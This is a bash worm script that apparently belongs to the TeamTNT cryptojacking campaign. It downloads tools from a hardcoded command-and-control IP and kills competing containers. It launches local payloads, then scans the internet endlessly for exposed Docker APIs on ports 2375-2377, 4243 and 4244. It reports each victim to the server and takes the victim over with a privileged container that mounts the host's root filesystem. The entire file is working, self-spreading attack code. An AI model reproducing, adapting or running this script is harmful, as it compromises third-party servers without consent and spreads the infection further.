#!/bin/bash
RATE_TO_SCAN=500000


if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y wget curl jq bash masscan libpcap-dev ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y wget curl jq bash masscan libpcap-devel ; fi
if ! type zgrab 2>/dev/null 1>/dev/null; then wget http://45.9.148.85/bin/zgrab -O /usr/bin/zgrab && chmod +x /usr/bin/zgrab ; fi
if ! type docker 2>/dev/null; then curl -sLk https://get.docker.com | bash ; fi
docker stop $(docker ps | grep -v 'CONTAINER' | grep -v 'tntpwner2\|b0rgdrone24\|dockgeddon' | awk '{print $1}')
clear ; echo "" ; echo ""
echo CgoKICAgICAgICBfX19fXyAgICAgICAgICAgICAgICAgICAgX19fX18gICAgX18gIF9fX19fICAgXyBfIF8gICAgICAgICAgICAgIAogICAgICAgL19fICAgXF9fXyAgX18gXyBfIF9fIF9fXy9fXyAgIFwvXCBcIFwvX18gICBcIHwgKF8pIHwgX19fX18gIF9fXyAgCiAgICAgICAgIC8gL1wvIF8gXC8gX2AgfCAnXyBgIF8gXCAvIC9cLyAgXC8gLyAgLyAvXC8gfCB8IHwgfC8gLyBfIFwvIF9ffCAKICAgICAgICAvIC8gfCAgX18vIChffCB8IHwgfCB8IHwgLyAvIC8gL1wgIC8gIC8gLyAgICB8IHwgfCAgIDwgIF9fL1xfXyBcIAogICAgICAgIFwvICAgXF9fX3xcX18sX3xffCB8X3wgfF9cLyAgXF9cIFwvICAgXC8gICAgIHxffF98X3xcX1xfX198fF9fXy8gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIF8gICBfICAgICAgICAgICAgICBfX18gIF9fXyAgICBfXyAgICBfX18gICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICB8IHxffCB8X18gICBfX18gICAgLyBfX1wvIF8gXCAgL19fXCAgLyBfIFwgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgIHwgX198ICdfIFwgLyBfIFwgIC9fX1wvLyB8IHwgfC8gXC8vIC8gL19cLyAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgfCB8X3wgfCB8IHwgIF9fLyAvIFwvICBcIHxffCAvIF8gIFwvIC9fXFwgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgXF9ffF98IHxffFxfX198IFxfX19fXy9cX19fL1wvIFxfL1xfX19fLyAgICAgICAgICAgICAgICAgCgoKCgoK | base64 -d
sleep 6

chmod +x /usr/bin/zgrab
chmod +x /root/dockerd
chmod +x /root/TNTfeatB0RG

/root/TNTfeatB0RG
nice -n -20 /root/dockerd || /root/dockerd

dAPIpwn(){
range=$1
port=$2
rate=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan $range -p$port --rate=$rate | awk '{print $6}'| zgrab --senders 200 --port $port --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";

for ipaddy in ${!rndstr}
do

TARGET=$ipaddy:$port

echo '##################################################'
curl -sLk http://45.9.148.85/input/da.php?vuln=$TARGET -o /dev/null
echo $TARGET

timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged --name dockgeddon -v /:/host mangletmpuser/dockgeddon

done
}

while true 
do
RANGE=$(curl -sLk http://45.9.148.85/input/da_range.php)".0.0.0/8"
dAPIpwn $RANGE 2375 $RATE_TO_SCAN
dAPIpwn $RANGE 2376 $RATE_TO_SCAN
dAPIpwn $RANGE 2377 $RATE_TO_SCAN
dAPIpwn $RANGE 4244 $RATE_TO_SCAN
dAPIpwn $RANGE 4243 $RATE_TO_SCAN
done 


